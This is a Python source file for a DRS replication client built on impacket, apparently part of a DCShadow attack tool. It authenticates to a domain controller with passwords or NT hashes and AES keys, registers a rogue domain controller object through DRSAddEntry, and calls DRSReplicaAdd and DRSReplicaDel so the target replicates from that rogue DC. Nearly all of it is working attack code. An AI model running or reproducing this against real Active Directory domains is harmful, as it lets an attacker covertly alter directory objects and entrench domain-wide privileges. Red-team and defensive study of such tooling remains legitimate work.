from typing import List, Any

from R2Log import logger
from ldap3.protocol.formatters.formatters import format_sid

from impacket import uuid
from impacket.dcerpc.v5 import epm, transport, drsuapi, dtypes
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
# from dcshadow.model.ReplicationAttribute import ReplicationAttribute
# from dcshadow.model.DomainController import RogueDomainController


class DrsClient:
    session = None
    handle = None

    def __init__(self, username: str, password: str, domain: str, lm_hash: str, nt_hash: str, aes_key: str, dc_ip: str):
        """Initilizing a DCE/RPC connection for DRS operations"""
        stringBinding = epm.hept_map(destHost=dc_ip, remoteIf=drsuapi.MSRPC_UUID_DRSUAPI, protocol="ncacn_ip_tcp")
        rpctransport = transport.DCERPCTransportFactory(stringbinding=stringBinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lm_hash, nthash=nt_hash, aesKey=aes_key)
        self.session = rpctransport.get_dce_rpc()
        self.session.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.session.connect()
        self.session.bind(drsuapi.MSRPC_UUID_DRSUAPI)

    def bind(self):
        """4.1.3 IDL_DRSBind (Opnum 0)"""
        request_bind = drsuapi.DRSBind()
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drsuapi.DRS_EXTENSIONS_INT()) - len(dtypes.DWORD())
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['dwReplEpoch'] = 0
        request_bind['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        request_bind['pextClient']['cb'] = len(drs.getData())
        request_bind['pextClient']['rgb'] = list(drs.getData())
        try:
            resp_bind = self.session.request(request_bind)
            logger.debug("DRSBind OK")
        except Exception as e:
            logger.error(f"DRSBind: {e}")
            return

        # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
        # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()
        ppextServer = b''.join(resp_bind['ppextServer']['rgb']) + b'\x00' * (len(drsuapi.DRS_EXTENSIONS_INT()) - resp_bind['ppextServer']['cb'])
        drsExtensionsInt.fromString(ppextServer)
        if drsExtensionsInt['dwReplEpoch'] != 0:
            # Different epoch, we have to call DRSBind again
            drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
            request_bind['pextClient']['cb'] = len(drs.getData())
            request_bind['pextClient']['rgb'] = list(drs.getData())
            resp_bind = self.session.request(request_bind)

        self.handle = resp_bind['phDrs']

    def unbind(self):
        """4.1.25 IDL_DRSUnbind (Opnum 1)"""
        request_unbind = drsuapi.DRSUnbind()
        request_unbind["phDrs"] = self.handle
        try:
            resp_unbind = self.session.request(request_unbind)
            logger.debug("DRSUnbind OK")
        except Exception as e:
            logger.error(f"DRSUnbind: {e}")
        return

    def add_entry(self, rogue_dc, repl_attributes):
        """4.1.1 IDL_DRSAddEntry (Opnum 17)"""
        logger.debug("Creating nTDSDSA object for rogue DC through DRSAddEntry request")
        # attributes = {
        #     "objectClass": "1.2.840.113556.1.5.7000.47",
        #     "objectCategory": f"CN=NTDS-DSA,{rogue_dc.schema_nc}",
        #     "dMDLocation": rogue_dc.schema_nc,
        #     "invocationId": uuid.generate(),
        #     "options": 0,
        #     "systemFlags": 16,
        #     "serverReference": rogue_dc.distinguished_name,
        #     "msDS-Behavior-Version": rogue_dc.func_level,
        #     "msDS-HasDomainNCs": rogue_dc.domain_nc,
        #     "msDS-hasMasterNCs": [rogue_dc.domain_nc, rogue_dc.configuration_nc, rogue_dc.schema_nc],
        #     "hasMasterNCs": [rogue_dc.domain_nc, rogue_dc.configuration_nc, rogue_dc.schema_nc]
        # }
        # repl_attributes = ReplicationAttribute.builder(attributes=attributes)
        self.bind()
        request = drsuapi.DRSAddEntry()
        request['hDrs'] = self.handle
        request['dwInVersion'] = 2
        request['pmsgIn']['tag'] = 2
        request['pmsgIn']['V2']['EntInfList'] = drsuapi.ENTINFLIST()
        request['pmsgIn']['V2']['EntInfList']['pNextEntInf'] = drsuapi.NULL
        request['pmsgIn']['V2']['EntInfList']['Entinf']['pName']['SidLen'] = 0
        request['pmsgIn']['V2']['EntInfList']['Entinf']['pName']['Sid'] = ''
        request['pmsgIn']['V2']['EntInfList']['Entinf']['pName']['Guid'] = drsuapi.NULLGUID
        _target_dsname = f"CN=NTDS Settings,{rogue_dc.dc_ds_service_name}"
        request['pmsgIn']['V2']['EntInfList']['Entinf']['pName']['NameLen'] = len(_target_dsname)
        request['pmsgIn']['V2']['EntInfList']['Entinf']['pName']['StringName'] = (_target_dsname + '\x00')
        request['pmsgIn']['V2']['EntInfList']['Entinf']['pName']['structLen'] = len(request['pmsgIn']['V2']['EntInfList']['Entinf']['pName'].getData())
        request['pmsgIn']['V2']['EntInfList']['Entinf']['ulFlags'] |= drsuapi.ENTINF_FROM_MASTER
        # request['pmsgIn']['V2']['EntInfList']['Entinf']['AttrBlock']['pAttr'] = drsuapi.PATTR_ARRAY()
        for attribute in repl_attributes:
            request['pmsgIn']['V2']['EntInfList']['Entinf']['AttrBlock']['pAttr'].append(attribute.serialized)
        request['pmsgIn']['V2']['EntInfList']['Entinf']['AttrBlock']['attrCount'] = len(request['pmsgIn']['V2']['EntInfList']['Entinf']['AttrBlock']['pAttr'])
        try:
            resp = self.session.request(request)
            if resp['pdwOutVersion'] == 2:
                if resp["pmsgOut"]["V2"]["errCode"] == 0 and resp["pmsgOut"]["V2"]["problem"] == 0 and resp["pmsgOut"]["V2"]["extendedErr"] == 0:
                    logger.debug("DRSAddEntry OK")
                    if len(resp['pmsgOut']['V2']['infoList']) > 1:
                        logger.debug("More than one affected object, something's wrong...")
                    for object in resp['pmsgOut']['V2']['infoList']:
                        logger.debug("nTDSDSA object created")
                        logger.debug(f"└── GUID:{uuid.bin_to_string(object['objGuid'])}")
                        logger.debug(f"└── SID:{format_sid(object['objSid'])}")
                else:
                    logger.debug("DRSAddEntry Failed")
                    logger.debug(f"└── errCode: {resp['pmsgOut']['V2']['errCode']}")
                    logger.debug(f"└── problem: {resp['pmsgOut']['V2']['problem']}")
                    logger.debug(f"└── extendedErr: {resp['pmsgOut']['V2']['extendedErr']}")
            else:
                logger.debug("Something failed, Response version != 2")
        except Exception as e:
            logger.error(f"DRSAddEntry: {e}")
        self.unbind()

    def replica_add(self, rogue_dc_dns_hostname, naming_context):
        """4.1.19 IDL_DRSReplicaAdd (Opnum 5)"""
        logger.debug("Calling DRSReplicaAdd to initiate replication from the legit dc")
        logger.debug(f"└── Rogue DC DNS hostname: {rogue_dc_dns_hostname}")
        logger.debug(f"└── Naming context: {naming_context}")
        self.bind()
        request_add = drsuapi.DRSReplicaAdd()
        request_add['hDrs'] = self.handle
        request_add['dwVersion'] = 1
        request_add['pmsgAdd']['tag'] = 1
        request_add['pmsgAdd']['V1']['pNC']['SidLen'] = 0
        request_add['pmsgAdd']['V1']['pNC']['Sid'] = ''
        request_add['pmsgAdd']['V1']['pNC']['Guid'] = drsuapi.NULLGUID
        request_add['pmsgAdd']['V1']['pNC']['NameLen'] = len(naming_context)
        request_add['pmsgAdd']['V1']['pNC']['StringName'] = (naming_context + '\x00')
        request_add['pmsgAdd']['V1']['pNC']['structLen'] = len(request_add['pmsgAdd']['V1']['pNC'].getData())
        request_add['pmsgAdd']['V1']['pszDsaSrc'] = (rogue_dc_dns_hostname + '\x00')
        # request_add['pmsgAdd']['V1']['pszDsaSrc'] = f"{self.info['FakeFQDN']}:{uuid.bin_to_string(self.info['mimiDc']['InstanceId']).lower()}" + '\x00'
        request_add['pmsgAdd']['V1']['ulOptions'] = drsuapi.DRS_WRIT_REP
        try:
            resp_add = self.session.request(request_add)
            logger.debug("DRSReplicaAdd OK")
        except Exception as e:
            logger.error(f"DRSReplicaAdd: {e}")
        return request_add

    def replica_del(self, replica_add_request):
        """4.1.20 IDL_DRSReplicaDel (Opnum 6)"""
        request_del = drsuapi.DRSReplicaDel()
        request_del['hDrs'] = replica_add_request['hDrs']
        request_del['dwVersion'] = replica_add_request['dwVersion']
        request_del['pmsgDel']['tag'] = 1
        request_del['pmsgDel']['V1']['pNC'] = replica_add_request['pmsgAdd']['V1']['pNC']
        request_del['pmsgDel']['V1']['pszDsaSrc'] = replica_add_request['pmsgAdd']['V1']['pszDsaSrc']
        request_del['pmsgDel']['V1']['ulOptions'] = drsuapi.DRS_WRIT_REP
        try:
            resp_del = self.session.request(request_del)
            logger.debug("DRSReplicaDel OK")
        except Exception as e:
            logger.error(f"DRSReplicaDel: {e}")
        self.unbind()
